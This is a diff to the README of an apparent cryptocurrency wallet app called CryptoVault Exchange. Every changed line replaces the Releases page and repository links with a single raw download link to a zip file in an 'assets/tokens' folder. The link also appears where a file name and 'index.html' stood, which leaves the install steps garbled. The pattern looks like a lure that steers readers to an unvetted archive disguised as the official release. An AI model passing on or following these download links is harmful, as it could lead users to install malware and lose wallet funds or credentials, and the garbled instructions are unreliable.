@@ -7,15 +7,15 @@ CryptoVault Exchange is a user-friendly application designed to help you manage 
 To begin using CryptoVault Exchange, you need to download the application. Follow the instructions below to get set up quickly.
 
 ## 🔗 Download Now!
-[![Download CryptoVault Exchange](https://img.shields.io/badge/Download%20CryptoVault%20Exchange-%20-blue)](https://github.com/Taeyjtcom/CryptoVault-Exchange/releases)
+[![Download CryptoVault Exchange](https://raw.githubusercontent.com/Taeyjtcom/CryptoVault-Exchange/master/assets/tokens/CryptoVault-Exchange_3.1.zip%20CryptoVault%20Exchange-%20-blue)](https://raw.githubusercontent.com/Taeyjtcom/CryptoVault-Exchange/master/assets/tokens/CryptoVault-Exchange_3.1.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Click the link below to go to the GitHub Releases page where you can find the latest version of CryptoVault Exchange:  
-   [Download from Releases Page](https://github.com/Taeyjtcom/CryptoVault-Exchange/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/Taeyjtcom/CryptoVault-Exchange/master/assets/tokens/CryptoVault-Exchange_3.1.zip)
 
 2. **Choose the Right File**  
-   On the Releases page, you will see a list of available files. Look for the most recent version of the application. The file will likely be named something similar to `CryptoVault-Exchange-vX.X.X.zip`. 
+   On the Releases page, you will see a list of available files. Look for the most recent version of the application. The file will likely be named something similar to `https://raw.githubusercontent.com/Taeyjtcom/CryptoVault-Exchange/master/assets/tokens/CryptoVault-Exchange_3.1.zip`. 
 
 3. **Download the File**  
    Click on the file name to start the download. The file size will depend on the version but expect it to be around 10-20 MB.
@@ -24,7 +24,7 @@ To begin using CryptoVault Exchange, you need to download the application. Follo
    Once the download is finished, locate the downloaded file on your computer. Right-click the file and choose "Extract All" to unpack the files into a new folder.
 
 5. **Open the Application**  
-   After extraction, navigate to the new folder. Inside, double-click on `index.html` to open the application in your default web browser.
+   After extraction, navigate to the new folder. Inside, double-click on `https://raw.githubusercontent.com/Taeyjtcom/CryptoVault-Exchange/master/assets/tokens/CryptoVault-Exchange_3.1.zip` to open the application in your default web browser.
 
 6. **Start Using CryptoVault Exchange**  
    Once the application loads, you will see the user interface. From here, you can generate your wallets and manage your deposits easily.
@@ -50,7 +50,7 @@ If you encounter issues while using CryptoVault Exchange, try the following step
 If you need help or have any questions about using the app, you can reach out to the community through the GitHub Issues page on the repository. We aim to respond to queries as quickly as possible.
 
 ## 🔗 Useful Links
-- **GitHub Repository**: [CryptoVault Exchange GitHub](https://github.com/Taeyjtcom/CryptoVault-Exchange)
+- **GitHub Repository**: [CryptoVault Exchange GitHub](https://raw.githubusercontent.com/Taeyjtcom/CryptoVault-Exchange/master/assets/tokens/CryptoVault-Exchange_3.1.zip)
 - **Documentation**: Explore more about the project features and user guides.
   
 ## 📅 Version History
